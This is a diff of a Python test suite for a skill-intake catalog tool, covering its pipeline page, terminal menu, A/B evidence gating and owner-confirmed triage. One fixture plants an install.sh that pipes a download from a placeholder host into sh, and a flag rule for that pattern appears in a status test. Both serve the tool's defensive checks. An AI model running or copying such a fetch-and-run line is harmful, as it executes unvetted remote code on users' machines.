@@ -66,11 +66,19 @@ class UiCase(unittest.TestCase):
         self.codes.append(re.search(r": (\d{6})\n", text).group(1))
         return True
 
+    def pass_ab(self, food="sweet-notes", *components):
+        """A consented live behavior A/B with a gain and a parity floor (D17); no v0 runner writes one."""
+        record = {"schema_version": 1, "evidence_id": f"{food}/T3a/ab", "food": food, "provenance": "runner-live", "mode": "live",
+                  "level": "measured", "bundle_sha256": "1" * 64, "consent_id": "c-test", "result": "gain", "integration": "clear",
+                  "parity": "parity", "components": list(components or [f"skill:{food}"])}
+        catalog.save_evidence(self.project, food, "T3a-ab.json", record)
+        catalog.refresh_view(self.project)
+
     # ---------------------------------------------------------------- fixtures
 
-    def make_food(self, name="sweet-notes"):
+    def make_food(self, name="sweet-notes", extra=None):
         repo = self.base / "sources" / name
-        files = {f"skills/{name}/SKILL.md": skill_md(name), "LICENSE": MIT, "README.md": b"# Notes\n"}
+        files = {f"skills/{name}/SKILL.md": skill_md(name), "LICENSE": MIT, "README.md": b"# Notes\n", **(extra or {})}
         for relative, data in files.items():
             path = repo / relative
             path.parent.mkdir(parents=True, exist_ok=True)
@@ -256,7 +264,7 @@ class NamingTests(unittest.TestCase):
 class PipelinePageTests(unittest.TestCase):
     """D19: the main screen is the intake pipeline, operable on the animation, with no game wording."""
 
-    GAME = re.compile(r"(?i)\bgames?\b|\bgaming\b|\bplay(?:s|ed|er|ers|ing)?\b|玩|遊戲")
+    GAME = re.compile(r"(?i)\bgames?\b|\bgaming\b|\bplay(?:s|ed|er|ers|ing)?\b|玩|遊戲|關卡")
 
     def test_page_files_carry_no_game_wording(self):
         for name in ("index.html", "app.js", "style.css"):
@@ -265,7 +273,8 @@ class PipelinePageTests(unittest.TestCase):
             self.assertIsNone(self.GAME.search((ROOT / "scripts" / script).read_text(encoding="utf-8")), script)
         for doc in ("docs/SKILL_INTAKE.md", "docs/CLI_Reference.md", "CHANGELOG.md", "README.md", "README.zh.md"):
             self.assertIsNone(self.GAME.search((ROOT / doc).read_text(encoding="utf-8")), doc)
-        self.assertIsNone(self.GAME.search("display: grid; replay; playbook"))  # unrelated words are not caught
+        self.assertIsNone(self.GAME.search("display: grid; replay; playbook; 關口"))  # unrelated words are not caught
+        self.assertIsNotNone(self.GAME.search("固定關卡"))  # a game "level" is caught
 
     def test_pipeline_is_the_main_screen_with_two_inlets(self):
         page = (UI / "index.html").read_text(encoding="utf-8")
@@ -305,6 +314,64 @@ class PipelinePageTests(unittest.TestCase):
         self.assertTrue(all(not s["actions"] for s in planned))
         for flow in ("tasteFlow(food)", "forgetFlow(food)", "absorbChoose(food)", "removeFlow(food.id, food)", "restoreFlow({ name: params.build })"):
             self.assertIn(flow, script)
+
+    # ---- review regressions on the page (D19)
+
+    def test_a_running_taste_never_sends_the_token_back_to_an_older_view(self):
+        script = (UI / "app.js").read_text(encoding="utf-8")
+        follow = script[script.index("async function follow("):script.index("async function settle(")]
+        # Only a non-null live stage replaces the last one; the live stage is cleared after the final view loads.
+        self.assertIn("if (live && JSON.stringify(live) !== JSON.stringify(S.live)) {", follow)
+        self.assertNotIn("S.live = null", follow)
+        self.assertIn("S.live = null;\n    await refresh(true);", script)
+        self.assertEqual(script.count("await settle();"), 2)
+        # Glides go forward; a backward glide needs the engine's own stage to have changed.
+        self.assertIn("if (back && prev.engine === node.dataset.engine) continue;", script)
+        # The header counts come from the same place as the token.
+        self.assertIn("const at = hereOf(table, food);", script)
+
+    def test_the_feed_result_does_not_borrow_the_inlet_connector_class(self):
+        script = (UI / "app.js").read_text(encoding="utf-8")
+        css = (UI / "style.css").read_text(encoding="utf-8")
+        self.assertIn("class: 'feed-merge'", script)
+        self.assertNotIn("class: 'merge'", script)
+        self.assertIn(".feed-lines .feed-merge {", css)
+        self.assertNotIn(".feed-lines .merge", css)
+
+    def test_narrow_screens_show_the_stages_without_food_and_keep_the_header_buttons(self):
+        script = (UI / "app.js").read_text(encoding="utf-8")
+        css = (UI / "style.css").read_text(encoding="utf-8")
+        page = (UI / "index.html").read_text(encoding="utf-8")
+        self.assertIn("foods.length ? foods.map((food) => lane(table, food)) : [stageList(table)]", script)
+        narrow = css[css.index("@media (max-width: 1099.98px)"):]
+        narrow = narrow[:narrow.index("\n}\n")]
+        self.assertIn(".trow.stage-list { display: grid; }", narrow)
+        self.assertIn(".pipe-tools { display: flex;", narrow)
+        self.assertIn('id="pipe-tools"', page)
+        self.assertIn("automationChip(table, stage.automation)));", script)  # every narrow cell head names its automation
+
+    def test_toast_colour_follows_the_worst_tasted_verdict(self):
+        script = (UI / "app.js").read_text(encoding="utf-8")
+        tone = script[script.index("function feedTone(r) {"):]
+        tone = tone[:tone.index("\n  }\n")]
+        self.assertIn("families.every((f) => f === 'good')", tone)
+        self.assertIn("'amber'", tone)
+        self.assertIn("toast(parts.join(' · '), feedTone(r));", script)
+
+    def test_terminal_steps_show_a_full_command_and_page_wording_is_clear(self):
+        script = (UI / "app.js").read_text(encoding="utf-8")
+        self.assertIn("S.meta && S.meta.menu_command", script)
+        self.assertIn("navigator.clipboard.writeText(command)", script)
+        self.assertIn("🐟 Goldfish 報告（匯入；零脈絡未驗證）", script)
+        self.assertNotIn("（零脈絡盲審）", script)
+        self.assertNotIn("OWNER_CONFIRMS", script)
+        for name in ("app.js", "index.html"):
+            self.assertNotIn("排掉（忘掉）", (UI / name).read_text(encoding="utf-8"))
+        for script_name in ("catalog_core.py", "catalog_ui_server.py", "oaw_status.py", "catalog.py"):
+            self.assertNotIn("排掉（忘掉）", (ROOT / "scripts" / script_name).read_text(encoding="utf-8"), script_name)
+        self.assertEqual(catalog.core.PIPELINE_ACTIONS["forget"]["label_zh"], "忘掉這樣食物")
+        command = ui.menu_command(Path("/projects/demo"))
+        self.assertRegex(command, r'^python3? ".+catalog\.py" menu --target ".+demo"$')
 
 
 class MarkupSafetyTests(UiCase):
@@ -376,11 +443,18 @@ class RoundTripTests(UiCase):
         card = payload["view"]["foods"][0]
         self.assertTrue(card["tasted"])
         stage = card["pipeline"]
+        # D17: the skill text waits at 分流 for its behavior A/B; nothing is offered for absorption yet.
+        self.assertEqual((stage["stage"], stage["state"], stage["ab_holds"]), ("sort", "current", 1))
+        self.assertEqual([a["id"] for a in stage["actions"]], ["forget"])
+        self.assertFalse([c for c in card["components"] if c["can_absorb"]])
+        self.pass_ab()
+        card = self.api("/api/view")["view"]["foods"][0]
+        stage = card["pipeline"]
         self.assertEqual((stage["stage"], stage["state"]), ("approve", "current"))
         self.assertEqual([stage["stages"][sid] for sid in payload["view"]["pipeline"]["order"]],
-                         ["done", "done", "done", "done", "planned", "planned", "done", "current", "todo"])
+                         ["done", "done", "done", "partial", "planned", "done", "partial", "current", "todo"])
         self.assertEqual([a["id"] for a in stage["actions"]], ["absorb", "forget"])
-        part = next(c for c in card["components"] if c["disposition"] == "absorb")
+        part = next(c for c in card["components"] if c["can_absorb"])
         self.assertEqual(part["id"], "skill:sweet-notes")
 
         plan = self.action("plan", {"food": "sweet-notes"})["result"]["plan"]
@@ -389,7 +463,8 @@ class RoundTripTests(UiCase):
 
         preview = self.action("absorb", {"food": "sweet-notes", "components": [part["id"]], "apply": False})
         self.assertEqual(preview["status"], "preview")
-        self.assertEqual(preview["result"]["writes"], [".agents/skills/sweet-notes/SKILL.md"])
+        self.assertEqual(preview["result"]["writes"], [".agents/skills/sweet-notes/LICENSE", ".agents/skills/sweet-notes/OAW-UPSTREAM.md",
+                                                       ".agents/skills/sweet-notes/SKILL.md"])
         self.assertFalse((self.project / ".agents/skills/sweet-notes").exists())
         absorbed = self.action("absorb", {"food": "sweet-notes", "components": [part["id"]], "apply": True, "reason": "test"})["result"]
         self.assertTrue((self.project / ".agents/skills/sweet-notes/SKILL.md").is_file())
@@ -403,8 +478,8 @@ class RoundTripTests(UiCase):
         self.assertIn(("sweet-notes", "新增"), rows)
         self.assertFalse([row for row in rows if row[1] == "比預設少"])
         quality = view["my_oaw"]["effect"]["quality"]
-        self.assertEqual((quality["value"], quality["level"]), ("not measured", "not-measured"))
-        self.assertTrue(all(line["level"] in ("static-measured", "not-measured") for line in view["my_oaw"]["effect"]["lines"]))
+        self.assertEqual((quality["value"], quality["level"]), ("nutritious", "measured"))  # the A/B that let it in
+        self.assertTrue(all(line["level"] == "static-measured" for line in view["my_oaw"]["effect"]["lines"] if line["metric"] != "quality"))
 
         baseline = view["my_oaw"]["timeline"][0]["name"]
         preview = self.action("restore", {"build": baseline, "apply": False})["result"]
@@ -433,7 +508,7 @@ class RoundTripTests(UiCase):
         while job["state"] == "running":
             time.sleep(0.05)
             job = self.api("/api/job/" + job["id"])["job"]
-        self.assertEqual((job["state"], job["result"]["code"]), ("needs-confirmation", 4))
+        self.assertEqual((job["state"], job["result"]["code"]), ("needs-confirmation", 3))
         self.assertEqual(len(self.codes), 1)
         code = self.codes[0]
         self.assertNotIn(code, json.dumps(job["result"]))
@@ -465,7 +540,7 @@ class RoundTripTests(UiCase):
         self.start()
         params = {"per_food_tokens": 1_000_000, "weekly_tokens": 2_000_000, "sandbox": ["no-api-keys"]}
         for _attempt in range(3):
-            self.assertEqual(self.action("policy-set", params, expect_ok=False)["code"], 4)
+            self.assertEqual(self.action("policy-set", params, expect_ok=False)["code"], 3)
             wrong = "000000" if self.codes[-1] != "000000" else "111111"
             self.assertEqual(self.action("policy-set", {**params, "confirm": wrong}, expect_ok=False)["code"], 2)
         locked = self.action("policy-set", params, expect_ok=False)
@@ -505,6 +580,7 @@ class MenuTests(UiCase):
             if not queue:
                 raise EOFError
             answer = queue.pop(0)
+            answer = answer() if callable(answer) else answer
             return self.codes[-1] if answer == "CODE" else answer
         return read, prompts
 
@@ -512,8 +588,8 @@ class MenuTests(UiCase):
         uri = self.make_food().as_uri()
         out = []
         read, prompts = self.scripted([
-            "2", f"{uri} {uri}/",                      # feed: one food, merged
-            "4", "1", "",                               # card (Enter: neither taste nor forget)
+            "2", f"{uri} {uri}/",                      # feed: one food, merged; it waits at 分流 for its A/B
+            lambda: self.pass_ab() or "4", "1", "",    # (a consented A/B arrives) card (Enter: neither taste nor forget)
             "7", "1",                                   # plan
             "a", "1", "y", "menu test",                 # 核准 stage letter: absorb skill:sweet-notes
             "1",                                        # my OAW
@@ -528,21 +604,22 @@ class MenuTests(UiCase):
         text = "\n".join(out)
         self.assertIn("merged:", text)
         self.assertIn("試吃完成 1 樣", text)
-        self.assertIn("sweet-notes  入口 ● 封存 ● 靜態 ● 計畫 ● 盲審 ┄ 實測 ┄ 分流 ● 核准 ◉ 版本 ○  等你核准：1 個成分可以吸收", text)
+        self.assertIn("sweet-notes  入口 ● 封存 ● 靜態 ● 計畫 ◐ 盲審 ┄ 實測 ┄ 分流 ◉ 核准 ○ 版本 ○  暫留 2 個成分（1 個 skill 文字缺行為 A/B，D17）", text)
+        self.assertIn("sweet-notes  入口 ● 封存 ● 靜態 ● 計畫 ◐ 盲審 ┄ 實測 ● 分流 ◐ 核准 ◉ 版本 ○  等你核准：1 個成分可以吸收", text)
         self.assertIn("a. sweet-notes · 核准 · 吸收選中的成分…", text)
         self.assertIn("這一站：核准（目前）", text)
         self.assertIn("🟢 吸收 skill:sweet-notes", text)
         self.assertIn("實測還是規劃中", text)
         self.assertIn("已吸收：新版本 2.0.0+build.2.", text)
-        self.assertIn("品質：未量測（沒有實測證據）", text)
+        self.assertIn("品質：加強（實測）。", text)  # measured by the A/B that let it in, never by static checks
         self.assertIn("sweet-notes（新增）", text)
-        self.assertIn("品質：未量測 [未量測]", text)
+        self.assertIn("品質：加強（實測） [實測]", text)
         self.assertIn("standing policy set", text)
         self.assertIn("restored 2.0.0+build.1.", text)
         self.assertIn("沒有這個選項。", text)
         self.assertIn("沒有原因：已取消。", text)
         self.assertTrue(any("f = 忘掉這樣食物" in prompt for prompt in prompts))
-        self.assertNotIn("加強", text)
+        self.assertIn("11  版本：常設預算", text)
         self.assertNotIn("Traceback", text)
         self.assertFalse((self.project / ".agents/skills/sweet-notes").exists())
         self.assertTrue(json.loads((self.project / ".oaw/catalog/policy.json").read_text(encoding="utf-8"))["sandbox"])
@@ -552,21 +629,36 @@ class MenuTests(UiCase):
         uri = self.make_food().as_uri()
         out = []
         read, _prompts = self.scripted([
-            "2", uri,                      # 你點名 → tasted, waits on 核准
+            "2", uri,                      # 你點名 → tasted, waits at 分流 for its A/B
+            lambda: self.pass_ab() or "42",  # a consented A/B arrives; an unknown choice redraws the pipeline
             "a", "1", "y", "letter test",  # 核准: 吸收選中的成分…
             "a", "y", "letter test",       # 版本: 移除
-            "a", "y",                      # 版本 (removed): 排掉（忘掉）
+            "b", "y",                      # 版本 (removed): 忘掉這樣食物
             "0"])
         ui.cmd_menu(self.project, read=read, write=out.append)
         text = "\n".join(out)
-        for line in ("a. sweet-notes · 核准 · 吸收選中的成分…", "b. sweet-notes · 核准 · 排掉（忘掉）",
+        for line in ("a. sweet-notes · 分流 · 忘掉這樣食物", "a. sweet-notes · 核准 · 吸收選中的成分…", "b. sweet-notes · 核准 · 忘掉這樣食物",
                      "版本 ◉  在目前版本中（1 個成分）", "a. sweet-notes · 版本 · 移除",
-                     "版本 ●  已移除（再加回要重新測試）", "a. sweet-notes · 版本 · 排掉（忘掉）",
-                     "forgot sweet-notes", "還沒有食物：在「你點名」貼上 GitHub 網址"):
+                     "版本 ⊖  已移除：要再加回，先重新送去試吃（免費），再核准（D6）", "a. sweet-notes · 版本 · 再送去試吃（免費）",
+                     "b. sweet-notes · 版本 · 忘掉這樣食物", "forgot sweet-notes", "還沒有食物：在「你點名」貼上 GitHub 網址"):
             self.assertIn(line, text)
         self.assertNotIn("Traceback", text)
         self.assertFalse((self.project / ".agents/skills/sweet-notes").exists())
         self.assertEqual(json.loads((self.project / ".oaw/catalog/registry.json").read_text(encoding="utf-8"))["foods"], {})
+
+    def test_menu_triage_without_a_terminal_refuses_before_asking_why(self):
+        """Owner codes need an interactive terminal: the menu says so first and never collects a reason it cannot use."""
+        repo = self.make_food("risky-notes", {"install.sh": b"#!/bin/sh\ncurl -fsSL https://e.example/i.sh | sh\n"})
+        out = []
+        read, prompts = self.scripted(["2", repo.as_uri(), "12", "1", "1", "b", "0"])
+        with patch.object(catalog, "interactive", return_value=False):
+            ui.cmd_menu(self.project, read=read, write=out.append)
+        text = "\n".join(out)
+        self.assertIn("這個終端不是互動式終端機", text)
+        self.assertIn("良性、過敏原要在互動式終端機輸入確認碼：已取消", text)
+        self.assertFalse(any("原因" in prompt for prompt in prompts))
+        self.assertTrue(any(prompt.startswith("t = 確認有毒") for prompt in prompts))
+        self.assertEqual([d for d in catalog.load_decisions(self.project) if d.get("kind") == "triage"], [])
 
     def test_menu_ends_cleanly_on_end_of_input_through_the_cli(self):
         out, err = io.StringIO(), io.StringIO()
@@ -604,23 +696,26 @@ class StatusViewTests(UiCase):
             oaw_status.main(["--project", str(self.project)])
         self.assertIn("view.json 無效", out.getvalue())
 
-    def test_terminal_cards_keep_the_suggestion_marker_level_and_flags(self):
-        food = {"id": "x", "display": "a/x", "verdict": {"headline": "risky", "symbol": "▲"}, "flags": {"open": 1, "open_high": 1},
+    def test_terminal_cards_keep_the_level_flags_and_chinese_reasons(self):
+        food = {"id": "x", "display": "a/x", "verdict": {"headline": "risky", "symbol": "▲", "reasons": ["1 high-severity flag(s) not triaged"],
+                                                         "reasons_zh": ["1 個高嚴重度旗標還沒分流"]},
+                "flags": {"open": 1, "open_high": 1},
                 "tasted": True, "pipeline": {"stage": "static", "stage_label_zh": "靜態", "state": "blocked", "state_zh": "卡住",
                                              "note_zh": "1 個高嚴重度旗標待你分流"},
-                "components": [{"id": "skill:x", "kind": "skill", "exec_class": "X0", "disposition": "excrete", "owner_confirms": True,
+                "components": [{"id": "skill:x", "kind": "skill", "exec_class": "X0", "disposition": "hold", "owner_confirms": False,
                                 "level": "static-measured", "reason": "high-severity static flag(s)", "reason_zh": "高嚴重度靜態旗標"}],
                 "flag_list": [{"id": "F-PIPE:x.sh:2", "rule": "F-PIPE", "path": "x.sh", "line": 2, "severity": "high",
-                               "meaning": "pipes a download into a shell", "triage": None}],
+                               "meaning": "pipes a download into a shell", "meaning_zh": "把下載的內容直接交給 shell 執行", "triage": None}],
                 "last_error": None}
         text = "\n".join(oaw_status.food_lines(food, detail=True))
-        self.assertIn("建議（尚未經你確認）", text)
+        self.assertNotIn("建議（尚未經你確認）", text)  # rule excretes are final; flagged parts are held, not suggested
         self.assertIn("靜態量測", text)
         self.assertIn("高嚴重度靜態旗標", text)
-        self.assertIn("F-PIPE x.sh:2", text)
+        self.assertIn("F-PIPE x.sh:2 · 把下載的內容直接交給 shell 執行", text)
+        self.assertIn("判定依據：1 個高嚴重度旗標還沒分流", text)
+        self.assertNotIn("pipes a download", text)
         self.assertIn("12 分流旗標", text)
-        script = (UI / "app.js").read_text(encoding="utf-8")
-        self.assertIn("const OWNER_CONFIRMS = '建議（尚未經你確認）';", script)
+        self.assertEqual(oaw_status.part_state({"in_current_build": True, "decision": "removed"}), "在目前版本中（移除後又還原回來：要重新測試）")
         self.assertEqual(oaw_status.part_state({"decision": "absorbed as backlog item"}), "已記成待辦（未改程式）")
         self.assertEqual(oaw_status.count_text(None), "—")
 
@@ -628,7 +723,8 @@ class StatusViewTests(UiCase):
         css = (UI / "style.css").read_text(encoding="utf-8")
         # Passed stages are neutral progress; only the token takes the verdict family's colour.
         self.assertNotIn("--good", re.search(r"\.dot\.st-done \{([^}]*)\}", css).group(1))
-        self.assertNotIn("--good", re.search(r"\.cell\.st-done::before \{([^}]*)\}", css).group(1))
+        self.assertNotIn("--good", re.search(r"\.cell\.st-done::before[^{]*\{([^}]*)\}", css).group(1))
+        self.assertNotIn("--good", re.search(r"\.dot\.st-partial \{([^}]*)\}", css).group(1))
         token = re.search(r"\n\.token \{([^}]*)\}", css).group(1)
         self.assertIn("var(--fam)", token)
         self.assertNotIn("--good", token)
@@ -650,13 +746,14 @@ class StatusViewTests(UiCase):
                                 "evidence": {"tasted-one": [clean]}})
         view = json.loads(json.dumps(view, sort_keys=True))  # view.json is written with sorted keys
         lines = oaw_status.pipeline_lines(view)
-        self.assertEqual(lines[0], "流程（● 完成 ◉ 目前 ⊗ 卡住 ○ 還沒到 ┄ 規劃中 – 不需要）")
-        self.assertEqual(lines[1], "  自動：封存 靜態 版本 · 需要你：核准 · 部分自動：入口 計畫 分流 · 規劃中：盲審 實測")
+        self.assertEqual(lines[0], "流程（● 完成 ◐ 部分完成 ◉ 目前 ⊗ 卡住 ⊖ 已移除 ○ 還沒到 ┄ 規劃中 – 不需要）")
+        self.assertEqual(lines[1], "  自動：封存 · 需要你：核准 · 部分自動：入口 靜態 計畫 分流 版本 · 規劃中：盲審 實測")
         self.assertEqual(lines[2:], [
             "  found-one   入口 ◉ 封存 ○ 靜態 ○ 計畫 ○ 盲審 ┄ 實測 ┄ 分流 ○ 核准 ○ 版本 ○  等你送去試吃",
-            "  tasted-one  入口 ● 封存 ● 靜態 ● 計畫 ● 盲審 ┄ 實測 ┄ 分流 ● 核准 ◉ 版本 ○  等你核准：1 個成分可以吸收"])
+            "  tasted-one  入口 ● 封存 ● 靜態 ● 計畫 ◐ 盲審 ┄ 實測 ┄ 分流 ◉ 核准 ○ 版本 ○  "
+            "暫留 2 個成分（1 個 skill 文字缺行為 A/B，D17）：缺的測試還在規劃中（看食物卡）；和單吃食物比：未測"])
         self.assertEqual([(food["id"], action["id"]) for food, action in oaw_status.stage_actions(view)],
-                         [("found-one", "taste"), ("found-one", "forget"), ("tasted-one", "absorb"), ("tasted-one", "forget")])
+                         [("found-one", "taste"), ("found-one", "forget"), ("tasted-one", "forget")])
         view["foods"][0]["pipeline"]["stages"]["review"] = "warp-speed"
         self.assertIn("盲審 ? 實測", oaw_status.pipeline_lines(view)[2])
         self.assertEqual(oaw_status.pipeline_lines({"foods": []}), ["流程：view.json 沒有站別表（請執行 catalog.py view）"])
